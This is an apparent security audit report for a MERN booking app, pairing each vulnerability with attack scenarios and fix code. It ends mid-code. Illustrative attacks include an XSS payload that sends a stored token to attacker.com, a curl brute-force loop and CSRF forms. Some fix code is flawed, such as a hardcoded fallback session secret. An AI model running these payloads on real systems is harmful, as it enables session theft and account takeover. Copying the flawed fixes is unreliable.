# 🔐 Comprehensive Security Audit Report: Trimly MERN Stack

**Date:** March 12, 2026  
**Audit Type:** Production SaaS Security Assessment  
**Risk Level:** 🔴 **HIGH** - Multiple critical vulnerabilities identified  

---

## Executive Summary

This comprehensive security audit of the Trimly MERN stack application identified **15 critical and high-risk vulnerabilities** across authentication, API security, client-side protection, and infrastructure. These vulnerabilities could enable attackers to:

- **Steal user sessions and gain unauthorized access**
- **Compromise sensitive user data**
- **Perform unauthorized actions with admin privileges**
- **Execute brute-force attacks at scale**
- **Inject malicious code into the application**

**⚠️ DO NOT DEPLOY TO PRODUCTION until these issues are resolved.**

---

## Vulnerability Findings

### 1. 🔴 CRITICAL: Insecure JWT Token Storage (localStorage)

**Vulnerability Name:** JWT Token Theft via XSS  
**CVSS Score:** 8.8 (High)

**Why It's Dangerous:**
- JWT tokens stored in `localStorage` are vulnerable to XSS attacks
- Any XSS vulnerability allows attackers to steal tokens and impersonate users
- Tokens remain in browser memory indefinitely until expiration
- No `HttpOnly` flag protection prevents JavaScript access

**Exact Location in Code:**

[admin/src/context/AuthContext.jsx](admin/src/context/AuthContext.jsx#L62) - Line 62-63:
```javascript
localStorage.setItem('token', jwt);
localStorage.setItem('user', JSON.stringify(usr));
```

[admin/src/utils/auth.js](admin/src/utils/auth.js#L16):
```javascript
export const getStoredToken = () => localStorage.getItem('token');
```

Similar patterns in:
- [user/src/pages/Login.jsx](user/src/pages/Login.jsx#L87)
- [user/src/utils/auth.js](user/src/utils/auth.js)
- [provider/src/context/AuthContext.jsx](provider/src/context/AuthContext.jsx#L128)

**Attack Scenario:**
```javascript
// Attacker injects XSS payload via service description or user profile
const xssPayload = `<img src=x onerror="
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
">`;

// When admin views the malicious content, token is sent to attacker's server
// Attacker then uses token to access admin endpoints
fetch('https://trimly.com/api/admin/users', {
  headers: { 'Authorization': 'Bearer ' + stolenToken }
});
```

**Secure Fix with Code Example:**

Move JWT to `HttpOnly` + `Secure` cookies via backend:

[backend/server.js](backend/server.js):
```javascript
// Add this middleware before routes
const cookieParser = require('cookie-parser');
const helmet = require('helmet');

app.use(helmet()); // Adds security headers
app.use(cookieParser());
app.use(cors({
  origin: allowedOrigins,
  credentials: true // Allow credentials in CORS
}));

// Modified login response
app.post('/api/auth/login', async (req, res) => {
  const token = signToken(user);
  
  // Set HttpOnly, Secure, SameSite cookie
  res.cookie('authToken', token, {
    httpOnly: true,      // Cannot be accessed via JavaScript (XSS safe)
    secure: true,        // Only sent over HTTPS
    sameSite: 'strict',  // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/',
    domain: process.env.COOKIE_DOMAIN || undefined
  });
  
  res.status(200).json({
    success: true,
    message: 'Logged in',
    data: { user: sanitizeUser(user) }
    // DO NOT return token
  });
});
```

Update axios interceptor:

[admin/src/api/axios.js](admin/src/api/axios.js):
```javascript
const api = axios.create({
  baseURL: API_BASE_URL,
  timeout: 10000,
  credentials: 'include', // Send cookies automatically
  headers: {
    'Content-Type': 'application/json',
  },
});

// Remove manual token attachment since cookies are automatic
api.interceptors.request.use(
  (config) => {
    const skipGlobalLoader = config.headers?.['x-skip-global-loader'] === 'true';
    if (!skipGlobalLoader) {
      beginRequest();
      config.__loaderTracked = true;
    }
    // Remove: const token = getStoredToken();
    // Cookies are sent automatically
    return config;
  },
  (error) => Promise.reject(error)
);
```

Update localStorage references to remove token storage:

```javascript
// Before (INSECURE)
localStorage.setItem('token', jwt);

// After (SECURE)
// Don't store token in localStorage - use HttpOnly cookie
// Only store non-sensitive user metadata if needed
localStorage.setItem('user', JSON.stringify({
  id: user.id,
  name: user.name,
  role: user.role
  // Never store token
}));
```

**Best Practice Recommendation:**
✅ Always use `HttpOnly`, `Secure`, `SameSite=Strict` cookies for sensitive tokens  
✅ Use `sessionStorage` only for client-side UI state, never for auth tokens  
✅ Implement token rotation on sensitive operations  
✅ Add refresh token protection with separate short-lived cookies

---

### 2. 🔴 CRITICAL: No Rate Limiting on Authentication Endpoints

**Vulnerability Name:** Brute Force Attack on Login/Registration  
**CVSS Score:** 8.6 (High)

**Why It's Dangerous:**
- Attackers can make unlimited login attempts to guess passwords
- Registration endpoint allows unlimited account creation
- No protection against dictionary attacks
- API exposed without throttling

**Exact Location in Code:**

[backend/routes/auth.js](backend/routes/auth.js):
```javascript
router.post('/register', registerValidator, handleValidation, register);
router.post('/login', loginValidator, handleValidation, login);
```

No rate limiting middleware is applied.

**Attack Scenario:**
```bash
# Attacker scripts a brute force attack
for i in {1..10000}; do
  curl -X POST https://trimly.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"phone":"9876543210","password":"pass'$i'"}'
done

# With 10,000 attempts, common passwords will be tried
# No delays, no IP blocking, no account lockout
```

**Secure Fix with Code Example:**

Install rate limiting:
```bash
npm install express-rate-limit
```

[backend/server.js](backend/server.js):
```javascript
const rateLimit = require('express-rate-limit');

// Strict rate limiter for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per windowMs
  message: 'Too many login attempts, please try again later',
  standardHeaders: true, // Return rate limit info in `RateLimit-*` headers
  legacyHeaders: false, // Disable `X-RateLimit-*` headers
  skip: (req) => {
    // Skip rate limiting for non-auth endpoints
    return !req.path.includes('/auth');
  },
  keyGenerator: (req) => {
    // Use IP + phone/email for more targeted protection
    return `${req.ip}-${req.body.phone || req.body.email}`;
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      message: 'Too many login attempts. Please try again in 15 minutes.'
    });
  }
});

// Apply rate limiter
app.use('/api/auth', authLimiter);

// Additional stricter limiter for password reset to prevent enumeration
const passwordResetLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3, // 3 requests per hour
  message: 'Too many password reset attempts',
  keyGenerator: (req) => {
    return `${req.ip}-${req.body.email || req.body.phone}`;
  }
});

app.post('/api/auth/forgot-password', passwordResetLimiter, forgotPassword);
app.post('/api/auth/forgotpassword', passwordResetLimiter, forgotPassword);
```

Implement account lockout mechanism back-end:

[backend/models/User.js](backend/models/User.js):
```javascript
const userSchema = new mongoose.Schema({
  // ... existing fields
  loginAttempts: {
    type: Number,
    default: 0
  },
  lockUntil: {
    type: Date,
    default: null
  },
  lastLoginAttempt: {
    type: Date,
    default: null
  }
});

// Method to check if account is locked
userSchema.methods.isLocked = function() {
  return this.lockUntil && this.lockUntil > new Date();
};

// Method to increment login attempts
userSchema.methods.incLoginAttempts = async function() {
  // Reset attempts if lock has expired
  if (this.lockUntil && this.lockUntil < new Date()) {
    return this.updateOne({
      $set: { loginAttempts: 1, lockUntil: null },
      $currentDate: { lastLoginAttempt: true }
    });
  }

  // Increment attempts
  const updates = { $inc: { loginAttempts: 1 }, $currentDate: { lastLoginAttempt: true } };

  // Lock account after 5 attempts for 30 minutes
  const maxAttempts = 5;
  const lockTimeMinutes = 30;
  
  if (this.loginAttempts + 1 >= maxAttempts && !this.isLocked()) {
    updates.$set = { lockUntil: new Date(Date.now() + lockTimeMinutes * 60 * 1000) };
  }

  return this.updateOne(updates);
};

// Method to reset attempts on successful login
userSchema.methods.resetLoginAttempts = function() {
  return this.updateOne({
    $set: { loginAttempts: 0, lockUntil: null }
  });
};
```

Update login controller:

[backend/controllers/authController.js](backend/controllers/authController.js):
```javascript
exports.login = asyncHandler(async (req, res, next) => {
  const { phone, email, identifier, password } = req.body;
  const loginId = resolveLoginIdentifier({ identifier, phone, email });
  
  if (!loginId || !password) {
    return next(new ErrorResponse('Phone/Email and password are required', 400));
  }

  const user = await findUserByLoginIdentifier(loginId);
  
  if (!user) {
    return next(new ErrorResponse('Invalid credentials', 401));
  }

  // Check if account is locked
  if (user.isLocked()) {
    return next(new ErrorResponse(
      'Account temporarily locked. Please try again in 30 minutes.',
      423
    ));
  }

  const isMatch = await user.comparePassword(password);
  if (!isMatch) {
    // Increment failed attempts
    await user.incLoginAttempts();
    
    return next(new ErrorResponse('Invalid credentials', 401));
  }

  // Reset attempts on successful login
  await user.resetLoginAttempts();

  // Rest of login logic...
  const token = signToken(user);
  
  res.status(200).json({
    success: true,
    message: 'Logged in',
    data: { token, user: sanitizeUser(user) }
  });
});
```

**Best Practice Recommendation:**
✅ Implement 5-attempt lockout for 30 minutes on authentication  
✅ Use exponential backoff: 1st failure = no delay, 2nd = 1s, 3rd = 4s, etc.  
✅ Rate limit per IP address + username/email combination  
✅ Log failed attempts for anomaly detection  
✅ Send email notification on repeated failed attempts  
✅ Implement CAPTCHA after 3 failed attempts

---

### 3. 🔴 CRITICAL: Weak Password Requirement (6 characters)

**Vulnerability Name:** Insufficient Password Entropy  
**CVSS Score:** 8.2 (High)

**Why It's Dangerous:**
- 6-character passwords can be cracked in milliseconds
- NIST recommends minimum 8 characters, typically 12+
- Even with bcrypt, weak passwords are still vulnerable
- Most common passwords are 6 characters

**Exact Location in Code:**

[backend/validators/authValidators.js](backend/validators/authValidators.js#L6):
```javascript
body('password')
  .trim()
  .isLength({ min: 6 }) // ❌ WEAK
  .withMessage('Password must be at least 6 characters'),
```

[backend/controllers/authController.js](backend/controllers/authController.js#L125):
```javascript
if (password.length < 6) {
  return next(new ErrorResponse('Password must be at least 6 characters', 400));
}
```

**Secure Fix with Code Example:**

Update validators:

```javascript
// backend/validators/authValidators.js
const { body } = require('express-validator');

// Password strength validator
const passwordValidator = body('password')
  .trim()
  .isLength({ min: 12 }) // Minimum 12 characters
  .withMessage('Password must be at least 12 characters')
  .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/) // Complexity check
  .withMessage('Password must include uppercase, lowercase, numbers, and special characters');

const registerValidator = [
  // ... other validators
  passwordValidator,
  // ... rest of validators
];

const loginValidator = [
  body('password')
    .trim()
    .notEmpty()
    .withMessage('Password is required'),
  // ... rest
];
```

Add password strength meter frontend:

[admin/src/components/PasswordStrengthMeter.jsx](admin/src/components/PasswordStrengthMeter.jsx):
```javascript
import React, { useMemo } from 'react';

export const getPasswordStrength = (password) => {
  let strength = 0;
  
  if (!password) return { score: 0, label: 'No password', color: 'gray' };
  
  if (password.length >= 8) strength += 1;
  if (password.length >= 12) strength += 1;
  if (password.length >= 16) strength += 1;
  if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength += 1;
  if (/\d/.test(password)) strength += 1;
  if (/[@$!%*?&]/.test(password)) strength += 1;
  
  const labels = ['No password', 'Weak', 'Fair', 'Good', 'Strong', 'Very Strong'];
  const colors = ['gray', 'red', 'orange', 'yellow', 'lime', 'green'];
  
  return {
    score: Math.min(strength, 5),
    label: labels[strength],
    color: colors[strength]
  };
};

export default function PasswordStrengthMeter({ password }) {
  const strength = useMemo(() => getPasswordStrength(password), [password]);
  
  return (
    <div className="mt-2">
      <div className="flex gap-1">
        {[...Array(5)].map((_, i) => (
          <div
            key={i}
            className={`h-1 flex-1 rounded ${
              i < strength.score
                ? `bg-${strength.color}-500`
                : 'bg-gray-200'
            }`}
          />
        ))}
      </div>
      <p className={`text-xs mt-1 text-${strength.color}-600`}>
        {strength.label}
      </p>
    </div>
  );
}
```

**Best Practice Recommendation:**
✅ Enforce minimum 12-character passwords  
✅ Require mix of: uppercase, lowercase, digits, special characters  
✅ Disallow common passwords (check against haveibeenpwned.com API)  
✅ Implement password expiration (90 days) for high-privilege accounts (admins)  
✅ Use zxcvbn library to measure password strength in real-time  
✅ Reject passwords containing username, email, or company name

---

### 4. 🔴 CRITICAL: No CSRF Protection

**Vulnerability Name:** Cross-Site Request Forgery (CSRF)  
**CVSS Score:** 7.5 (High)

**Why It's Dangerous:**
- Authenticated users are tricked into performing unwanted actions
- Attacker can change account details, make bookings, transfer funds
- No token validation prevents cross-origin requests
- Especially dangerous for admin operations

**Exact Location in Code:**

[backend/server.js](backend/server.js):
```javascript
app.use(cors()); // Permissive CORS without CSRF tokens
// No CSRF token generation or validation anywhere
```

No CSRF middleware or token validation in any route.

**Attack Scenario:**
```html
<!-- Attacker's website -->
<img src="https://trimly.com/api/admin/users/6789/delete" 
     style="display:none;" />

<!-- When logged-in admin views this page, user gets deleted -->
<!-- Or booking status changes, commission rate updated, etc. -->

<!-- Form-based CSRF -->
<form action="https://trimly.com/api/admin/commissions/services/123" 
      method="POST" style="display:none;">
  <input name="commissionRate" value="0">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

**Secure Fix with Code Example:**

Install CSRF protection:
```bash
npm install csurf
```

[backend/server.js](backend/server.js):
```javascript
const csrf = require('csurf');
const session = require('express-session');
const mongoSanitize = require('express-mongo-sanitize');

// Session middleware required for CSRF tokens (or use token-based approach)
app.use(session({
  secret: process.env.SESSION_SECRET || 'your-secret-key',
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
    httpOnly: true,
    sameSite: 'strict'
  }
}));

// Data sanitization against NoSQL injection
app.use(mongoSanitize());

// Enable CSRF protection
const csrfProtection = csrf({ cookie: false }); // Use session-based tokens

// Provide CSRF token endpoint for frontend
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Apply CSRF protection to all state-changing routes
app.post('/api/auth/register', csrfProtection, registerValidator, handleValidation, register);
app.post('/api/auth/login', csrfProtection, loginValidator, handleValidation, login);
app.post('/api/admin/*', csrfProtection, protect, onlyAdmin, ...);
app.put('/api/admin/*', csrfProtection, protect, onlyAdmin, ...);
app.patch('/api/admin/*', csrfProtection, protect, onlyAdmin, ...);
app.delete('/api/admin/*', csrfProtection, protect, onlyAdmin, ...);

// CSRF error handler
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    res.status(403).json({
      success: false,
      message: 'Invalid CSRF token'
    });
  } else {
    next(err);
  }
});
```

Frontend implementation:

[admin/src/api/axios.js](admin/src/api/axios.js):
```javascript
let csrfToken = '';

/**  
 * Fetch CSRF token on app initialization
 */
async function initializeCsrfToken() {
  try {
    const response = await axios.get(`${API_BASE_URL}/csrf-token`);
    csrfToken = response.data.csrfToken;
  } catch (error) {
    console.error('Failed to fetch CSRF token:', error);
  }
}

// Call on app startup
initializeCsrfToken();

// Attach CSRF token to all requests
api.interceptors.request.use((config) => {
  if (csrfToken && ['post', 'put', 'patch', 'delete'].includes(config.method)) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});

// Refresh CSRF token on 403 error
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 403 && error.response?.data?.message?.includes('CSRF')) {
      await initializeCsrfToken();
      // Retry the request
      return api.request(error.config);
    }
    return Promise.reject(error);
  }
);
```

**Best Practice Recommendation:**
✅ Use CSRF tokens for all state-changing requests (POST, PUT, PATCH, DELETE)  
✅ Implement SameSite=Strict cookies to prevent cookie leakage  
✅ Validate tokens server-side before processing requests  
✅ Use short token expiration times (1 hour or per-session)  
✅ Implement double-submit cookie pattern as fallback

---

### 5. 🔴 HIGH: Missing Security Headers (No Helmet)

**Vulnerability Name:** Missing HTTP Security Headers  
**CVSS Score:** 7.2 (High)

**Why It's Dangerous:**
- No `X-Frame-Options` allows clickjacking attacks
- Missing `X-Content-Type-Options` leads to MIME sniffing
- No `Strict-Transport-Security` allows downgrade to HTTP
- Missing CSP allows inline script execution and XSS
- Enables exploitation of browser vulnerabilities

**Exact Location in Code:**

[backend/server.js](backend/server.js):
```javascript
const app = express();

// middlewares
app.use(cors());
app.use(express.json({ limit: '8mb' }));
// ❌ No security headers middleware
```

**Attack Scenario:**
```html
<!-- Clickjacking: embed admin panel in hidden iframe -->
<iframe src="https://trimly.com/admin/dashboard" style="display:none;"></iframe>

<!-- Admin's clicks are intercepted and redirected to attacker's site -->
<div style="position: absolute; opacity: 0; top: 0; left: 0; 
            width: 100%; height: 100%;">
  <a href="https://attacker.com">Click here to claim prize</a>
</div>
```

**Secure Fix with Code Example:**

Install helmet:
```bash
npm install helmet
```

[backend/server.js](backend/server.js):
```javascript
const helmet = require('helmet');

const app = express();

// Security headers with Helmet
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Consider removing unsafe-inline
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'"],
      connectSrc: ["'self'", "https://api.example.com"],
      frameSrc: ["'none'"], // Prevent framing
      objectSrc: ["'none'"],
      upgradeInsecureRequests: process.env.NODE_ENV === 'production'
    }
  },
  frameguard: { action: 'deny' }, // Prevent clickjacking
  noSniff: true, // Prevent MIME sniffing
  xssFilter: true, // Enable XSS filter
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));

// CORS before routes
app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  optionsSuccessStatus: 200
}));

app.use(express.json({ limit: '1mb' })); // Reduced from 8mb
```

Content Security Policy rules:

```javascript
// backend/config/csp.js
module.exports = {
  directives: {
    defaultSrc: ["'self'"],
    
    // Scripts: only from own domain
    scriptSrc: [
      "'self'",
      // Add third-party scripts if necessary
      "https://cdn.jsdelivr.net", // For libraries
      "https://analytics.google.com" // For analytics
    ],
    
    // Styles: allow inline for Tailwind, but consider external
    styleSrc: [
      "'self'",
      "https://fonts.googleapis.com",
      "'unsafe-inline'" // Try to remove this in future
    ],
    
    // Images: same-origin and HTTPS
    imgSrc: ["'self'", "data:", "https:"],
    
    // Fonts: Google Fonts and local
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    
    // API connections: your backend only
    connectSrc: [
      "'self'",
      "https://api.trimly.com",
      "wss://api.trimly.com" // WebSocket for Socket.io
    ],
    
    // Prevent embedding in iframes
    frameSrc: ["'none'"],
    
    // Prevent object embedding
    objectSrc: ["'none'"],
    
    // Upgrade insecure requests in production
    upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : undefined,
    
    // Report violations (optional)
    reportUri: ["/api/csp-report"]
  }
};
```

Add CSP violation reporting:

```javascript
// backend/routes/security.js
const express = require('express');
const router = express.Router();

router.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body;
  
  console.warn('CSP Violation:', {
    'document-uri': report['document-uri'],
    'violated-directive': report['violated-directive'],
    'blocked-uri': report['blocked-uri'],
    'source-file': report['source-file'],
    'line-number': report['line-number'],
    'column-number': report['column-number']
  });
  
  // Could log to external service like Sentry
  // TODO: Log to security monitoring service
  
  res.status(204).send();
});

module.exports = router;
```

**Best Practice Recommendation:**
✅ Use Helmet.js for all standard security headers  
✅ Implement strict CSP without `unsafe-inline`  
✅ Enable HSTS with `preload` directive  
✅ Set `X-Frame-Options: DENY` to prevent clickjacking  
✅ Monitor CSP violations and adjust policy quarterly  
✅ Use `Referrer-Policy: strict-origin-when-cross-origin`

---

### 6. 🔴 HIGH: Inadequate Input Validation

**Vulnerability Name:** Insufficient Email & Phone Validation  
**CVSS Score:** 6.8 (Medium)

**Why It's Dangerous:**
- Regex-based validation can be bypassed
- Invalid emails/phones accepted, causing data quality issues
- NoSQL injection possible through inadequate escaping
- SQL-like attacks on MongoDB

**Exact Location in Code:**

[backend/utils/authIdentity.js](backend/utils/authIdentity.js):
```javascript
const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // ❌ Too permissive

// Allows "test@test.t" (not valid)
// Allows "user@domain" (no TLD)
// Allows multiple @ symbols: "test@@domain.com"
```

[user/src/pages/Login.jsx](user/src/pages/Login.jsx#L25):
```javascript
const phoneRegex = /^\+?[0-9\s()-]{8,20}$/; // ❌ Allows spaces and hyphens
// Allows "(123) 456-7890 x123" which is not a phone number
```

**Secure Fix with Code Example:**

Update validation utilities:

```javascript
// backend/utils/validators.js
const validator = require('email-validator'); // npm install email-validator

/**
 * Validate email format using industry standard
 */
export const validateEmail = (email) => {
  if (!email || typeof email !== 'string') return false;
  
  const normalized = email.trim().toLowerCase();
  
  // Check length
  if (normalized.length > 254) return false;
  
  // Use industry-standard validation
  return validator.validate(normalized);
};

/**
 * Validate and normalize phone numbers
 */
export const validatePhoneNumber = (phone) => {
  if (!phone || typeof phone !== 'string') return null;
  
  // Remove all non-digits except leading +
  let cleaned = phone.trim().replace(/[^\d+]/g, '');
  
  // Must start with + or have 10-15 digits
  if (!cleaned.startsWith('+')) {
    cleaned = cleaned.replace(/^\d/, ''); // Remove country code if missing +
  }
  
  const digitCount = cleaned.replace(/\D/g, '').length;
  
  // International standard: 7-15 digits
  if (digitCount < 7 || digitCount > 15) {
    return null;
  }
  
  return cleaned;
};

/**
 * Sanitize strings to prevent NoSQL injection
 */
export const sanitizeInput = (input) => {
  if (typeof input !== 'string') return input;
  
  // Remove dangerous characters
  return input
    .replace(/[{}$]/g, '') // Remove MongoDB operators
    .trim()
    .substring(0, 500); // Limit length
};
```

Update authentication controller:

```javascript
// backend/controllers/authController.js
const { validateEmail, validatePhoneNumber } = require('../utils/validators');

exports.register = asyncHandler(async (req, res, next) => {
  const { name, firstName, lastName, phone, email, password, role } = req.body;
  
  // Validate email
  let normalizedEmail = null;
  if (email) {
    if (!validateEmail(email)) {
      return next(new ErrorResponse('Invalid email format', 400));
    }
    normalizedEmail = email.trim().toLowerCase();
  }
  
  // Validate phone
  let normalizedPhone = null;
  if (phone) {
    normalizedPhone = validatePhoneNumber(phone);
    if (!normalizedPhone) {
      return next(new ErrorResponse('Invalid phone number', 400));
    }
  }
  
  if (!normalizedEmail && !normalizedPhone) {
    return next(new ErrorResponse('Valid email or phone is required', 400));
  }
  
  // Validate password strength
  if (password.length < 12) {
    return next(new ErrorResponse('Password must be at least 12 characters', 400));
  }
  
  if (!/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/.test(password)) {
    return next(new ErrorResponse(
      'Password must include uppercase, lowercase, numbers, and special characters',
      400
    ));
  }
  
  // Rest of function...
});
```

Add request body validation schema:

```javascript
// backend/validators/authValidators.js
const { body } = require('express-validator');
const { validateEmail, validatePhoneNumber } = require('../utils/validators');

const registerValidator = [
  body('email')
    .optional()
    .custom((value) => {
      if (value && !validateEmail(value)) {
        throw new Error('Invalid email format');
      }
      return true;
    }),
  
  body('phone')
    .optional()
    .custom((value) => {
      if (value && !validatePhoneNumber(value)) {
        throw new Error('Invalid phone number');
      }
      return true;
    }),
  
  body('password')
    .notEmpty().withMessage('Password is required')
    .isLength({ min: 12 }).withMessage('Password must be at least 12 characters')
    .matches(/[A-Z]/).withMessage('Password must contain uppercase')
    .matches(/[a-z]/).withMessage('Password must contain lowercase')
    .matches(/\d/).withMessage('Password must contain digits')
    .matches(/[@$!%*?&]/).withMessage('Password must contain special characters'),
  
  body('name')
    .if(() => !body('firstName'))
    .trim()
    .isLength({ min: 2, max: 100 })
    .withMessage('Name must be 2-100 characters')
    .matches(/^[a-zA-Z\s'-]+$/)
    .withMessage('Name contains invalid characters'),
  
  body('firstName')
    .optional()
    .trim()
    .isLength({ min: 1, max: 50 })
    .withMessage('First name must be 1-50 characters')
];
```

**Best Practice Recommendation:**
✅ Use email-validator or similar library for emails  
✅ Validate phone numbers with libphonenumber library  
✅ Implement server-side validation for all inputs  
✅ Use length limits to prevent buffer overflow attacks  
✅ Whitelist acceptable characters rather than blacklist bad ones  
✅ Escape special characters when storing in database

---

### 7. 🔴 HIGH: Insecure Forgot Password Implementation

**Vulnerability Name:** Password Reset Information Disclosure  
**CVSS Score:** 7.8 (High)

**Why It's Dangerous:**
- No actual email sent, user enumeration possible
- Returns same response for existing/non-existing users
- Attackers can discover valid phone numbers/emails
- No reset token or verification, anyone can reset any password
- Allows account takeover

**Exact Location in Code:**

[backend/controllers/authController.js](backend/controllers/authController.js#L209):
```javascript
exports.forgotPassword = asyncHandler(async (req, res, next) => {
  const { email, phone, identifier } = req.body;
  const loginId = resolveLoginIdentifier({ identifier, phone, email });

  if (!loginId) {
    return next(new ErrorResponse('Please provide your email or phone number', 400));
  }

  const user = await findUserByLoginIdentifier(loginId);
  if (!user) {
    // ❌ Returns different response for existing/non-existing users
    return next(new ErrorResponse('No user found with this email/phone', 404));
  }

  // ❌ Just returns success, no email sent, no token generated
  res.status(200).json({
    success: true,
    message: 'Password reset request accepted'
  });
});
```

**Attack Scenario:**
```javascript
// Attacker enumerates valid users by checking responses
const phoneList = ['9876543210', '9876543211', '9876543212'];

for (const phone of phoneList) {
  const response = await fetch('https://trimly.com/api/auth/forgot-password', {
    method: 'POST',
    body: JSON.stringify({ phone })
  });
  
  if (response.status === 404) {
    console.log(`${phone} is NOT registered`);
  } else {
    console.log(`${phone} IS REGISTERED`);
  }
}

// Attacker can then:
// 1. Buy phone number in a phone forwarding service
// 2. Reset password of a known admin
// 3. Gain access to admin account
```

**Secure Fix with Code Example:**

Implement secure password reset with tokens:

```bash
npm install nodemailer bcryptjs
```

Add reset token to User model:

```javascript
// backend/models/User.js
const userSchema = new mongoose.Schema({
  // ... existing fields
  resetPasswordToken: {
    type: String,
    select: false // Don't return by default
  },
  resetPasswordExpires: {
    type: Date,
    select: false
  }
});

// Method to generate reset token
userSchema.methods.generateResetToken = function() {
  const resetToken = crypto.randomBytes(32).toString('hex');
  
  // Hash and store
  this.resetPasswordToken = crypto
    .createHash('sha256')
    .update(resetToken)
    .digest('hex');
  
  // Expire in 1 hour
  this.resetPasswordExpires = Date.now() + 60 * 60 * 1000;
  
  return resetToken; // Plain token to send to user
};

// Method to validate reset token
userSchema.methods.validateResetToken = function(token) {
  const hashedToken = crypto
    .createHash('sha256')
    .update(token)
    .digest('hex');
  
  return (
    this.resetPasswordToken === hashedToken &&
    this.resetPasswordExpires > Date.now()
  );
};
```

Implement secure password reset endpoint:

```javascript
// backend/controllers/authController.js
const crypto = require('crypto');
const nodemailer = require('nodemailer');

// Initialize email service
const emailService = nodemailer.createTransport({
  service: 'gmail', // Or SendGrid, AWS SES, etc.
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});

/**
 * @desc    Send password reset email
 * @route   POST /api/auth/forgot-password
 * @access  Public
 */
exports.forgotPassword = asyncHandler(async (req, res, next) => {
  const { email, phone, identifier } = req.body;
  const loginId = resolveLoginIdentifier({ identifier, phone, email });

  if (!loginId) {
    // Always return same response to prevent user enumeration
    return res.status(200).json({
      success: true,
      message: 'If an account exists, password reset email has been sent'
    });
  }

  const user = await findUserByLoginIdentifier(loginId);
  
  // Always return same response (don't reveal if user exists)
  if (!user) {
    return res.status(200).json({
      success: true,
      message: 'If an account exists, password reset email has been sent'
    });
  }

  // Generate reset token
  const resetToken = user.generateResetToken();
  await user.save({ validateBeforeSave: false });

  // Create reset URL
  const resetUrl = `${process.env.FRONTEND_URL}/reset-password?token=${resetToken}&email=${encodeURIComponent(user.email)}`;

  try {
    await emailService.sendMail({
      to: user.email || user.phone, // Use phone if email unavailable
      subject: 'Trimly - Password Reset Request',
      html: `
        <h2>Password Reset Request</h2>
        <p>Click the link below to reset your password:</p>
        <a href="${resetUrl}">
          Reset Password
        </a>
        <p>This link will expire in 1 hour.</p>
        <p>If you didn't request this, please ignore this email.</p>
      `
    });

    res.status(200).json({
      success: true,
      message: 'If an account exists, password reset email has been sent'
    });
  } catch (error) {
    // Clear tokens on email failure
    user.resetPasswordToken = undefined;
    user.resetPasswordExpires = undefined;
    await user.save({ validateBeforeSave: false });

    return next(new ErrorResponse('Failed to send reset email', 500));
  }
});

/**
 * @desc    Reset password using token
 * @route   POST /api/auth/reset-password
 * @access  Public
 */
exports.resetPassword = asyncHandler(async (req, res, next) => {
  const { token, email, password, confirmPassword } = req.body;

  if (!token || !email || !password) {
    return next(new ErrorResponse('Missing required fields', 400));
  }

  if (password !== confirmPassword) {
    return next(new ErrorResponse('Passwords do not match', 400));
  }

  if (password.length < 12) {
    return next(new ErrorResponse('Password must be at least 12 characters', 400));
  }

  // Find user and check token
  const user = await User.findOne({ email }).select('+resetPasswordToken +resetPasswordExpires');

  if (!user || !user.validateResetToken(token)) {
    return next(new ErrorResponse('Invalid or expired reset token', 400));
  }

  // Update password
  const hashedPassword = await User.hashPassword(password);
  user.password = hashedPassword;
  user.resetPasswordToken = undefined;
  user.resetPasswordExpires = undefined;

  await user.save();

  // Log in user automatically
  const newToken = signToken(user);

  res.status(200).json({
    success: true,
    message: 'Password reset successful',
    data: {
      token: newToken,
      user: sanitizeUser(user)
    }
  });
});
```

Add frontend reset password page:

```javascript
// user/src/pages/ResetPassword.jsx
import { useState } from 'react';
import { useSearchParams } from 'react-router-dom';
import api from '../utils/api';
import PasswordStrengthMeter from '../components/PasswordStrengthMeter';

export default function ResetPassword() {
  const [searchParams] = useSearchParams();
  const token = searchParams.get('token');
  const email = searchParams.get('email');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    if (password !== confirmPassword) {
      setError('Passwords do not match');
      return;
    }

    if (password.length < 12) {
      setError('Password must be at least 12 characters');
      return;
    }

    setLoading(true);
    try {
      await api.post('/auth/reset-password', {
        token,
        email,
        password,
        confirmPassword
      });

      setSuccess(true);
      // Redirect to dashboard after 2 seconds
      setTimeout(() => {
        window.location.href = '/services';
      }, 2000);
    } catch (err) {
      setError(err.response?.data?.message || 'Failed to reset password');
    } finally {
      setLoading(false);
    }
  };

  if (!token || !email) {
    return <div>Invalid reset link</div>;
  }

  return (
    <div className="max-w-md mx-auto p-6">
      <h1 className="text-2xl font-bold mb-4">Reset Password</h1>
      
